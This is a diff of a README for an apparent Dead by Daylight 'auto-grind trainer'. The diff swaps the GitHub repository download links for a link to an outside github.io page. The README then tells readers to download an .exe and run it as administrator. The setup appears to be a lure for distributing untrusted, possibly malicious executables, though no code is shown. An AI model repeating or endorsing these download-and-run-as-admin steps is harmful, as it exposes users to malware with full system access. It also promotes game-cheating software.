@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Plus - Automate your Dead by Daylight progression
 
-[![Download DBD-AutoGrind-Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Iritisgoalkick107/DBD-AutoGrind-Trainer-2026-Plus)
+[![Download DBD-AutoGrind-Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://iritisgoalkick107.github.io)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications before you begin:
 Follow these steps to set up the software on your computer.
 
 1. Visit the repository link below to open the release page.
-   [Download Link](https://github.com/Iritisgoalkick107/DBD-AutoGrind-Trainer-2026-Plus)
+   [Download Link](https://iritisgoalkick107.github.io)
 2. Locate the most recent file version ending in .exe.
 3. Save this file to a folder on your desktop.
 4. Right-click the file and choose Run as administrator.
